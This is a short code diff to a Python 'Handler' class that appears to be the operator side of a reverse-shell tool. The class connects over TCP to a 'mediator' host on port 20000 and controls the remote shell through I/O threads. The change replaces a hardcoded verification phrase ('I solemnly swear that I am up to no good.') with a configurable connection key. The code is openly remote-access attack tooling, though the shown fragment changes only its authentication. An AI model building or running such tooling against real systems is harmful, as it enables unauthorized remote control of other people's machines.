@@ -14,7 +14,8 @@ import threading
 
 
 class Handler:
-    def __init__(self, mediatorHost=""):
+    def __init__(self, mediatorHost="", connectionKey="CHANGE ME!!!"):
+        self.connectionKey = connectionKey
         self.shell = socket()
         self.shell.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
         self.stopReceiving = False
@@ -95,7 +96,7 @@ class Handler:
         # connect to moderator on operator port
         self.shell.connect((gethostbyname(mediatorHost), 20000))
         # send verification
-        self.shell.sendall("I solemnly swear that I am up to no good.".encode())
+        self.shell.sendall(self.connectionKey.encode())
 
     def run(self):
         # start I/O threads to control the reverse shell
